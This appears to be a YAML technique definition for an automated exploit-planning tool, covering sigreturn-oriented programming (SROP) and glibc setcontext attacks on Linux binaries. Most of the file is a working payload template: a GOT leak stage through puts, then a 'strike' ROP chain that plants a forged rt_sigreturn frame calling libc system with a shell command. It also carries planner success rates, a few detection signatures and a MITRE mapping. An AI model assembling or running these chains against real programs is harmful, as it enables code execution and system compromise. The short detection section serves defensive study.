technique: setcontext_srop
author: Gregory Epp
source: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/

rules:
  - id: app_setcontext_srop
    head: [applicable, setcontext_srop]
    conditions:
      - [fact, libc_present, true]
      - [fact, sigreturn_frame, true]
      - [fact, has_syscall_gadget, true]

kb:
  - id: setcontext_srop_001
    technique: setcontext_srop
    description: >
      The sigreturn path has two doors: the classic SROP frame and the
      setcontext gadget (offset +53/+61 in modern glibc) that loads a
      full register state from a controlled ucontext. Same primitive,
      fewer gadgets, no mprotect needed.
    chain: [frame_or_ucontext, setcontext_load, syscall_shell]
    unlocks: [shell]
    success_rate: 0.45

mcts:
  requires: [libc_base]
  provides: [shell]
  terminal: true
  success: 0.45

build:
  technique: setcontext_srop
  # the classic SROP door: pop rax=15, a libc `syscall; ret` gadget,
  # then the forged rt_sigreturn frame rides the payload itself. The
  # frame's gregs follow glibc's enum order (R8..R15, RDI, RSI, RBP,
  # RBX, RDX, RAX, RCX, RSP, RIP, EFL, CSGSFS, ERR, TRAPNO, OLDMASK,
  # CR2). The frame's rsp lands on the staging buffer (.bss, the
  # exploit's own stack), rdi = the command string, rip = the libc
  # system symbol. The leak stage rides the echo (puts(GOT[puts])).
  variants:
    - name: leak_stage
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
    - name: strike
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:pop_rax_ret", "const:15", "gadget:syscall_ret",
           "const:0", "const:0", "const:0", "const:0", "const:0",
           "const:0", "const:0", "const:0", "const:0", "const:0",
           "const:0", "const:0", "const:0",
           "leak:sh_cmd", "const:0", "const:0", "const:0", "const:0",
           "const:0", "const:0", "const:0", "const:0", "const:0",
           "const:0", "const:0", "const:0", "const:0", "const:0",
           "const:0",
           "sym:staging",
           "leak:system",
           "const:514", "const:51",
           "const:0", "const:0", "const:0", "const:0",
           "const:0",
           "const:0", "const:0", "const:0", "const:0", "const:0",
           "const:0", "const:0", "const:0"]

priors: [7, 13]


# The defender side (the corpus read backwards): what this technique
# looks like to the defenses. Armored by check 9.
detection:
  - channel: syscall
    signature: "rt_sigreturn issued far from a real signal (the frame pivot)"
    note: "the SROP frame being restored"
  - channel: crash
    signature: "register sets that never came from a signal delivery"
    note: "the forged context"

# The ATT&CK mapping (the navigator export consumes it)
mitre:
  - T1068
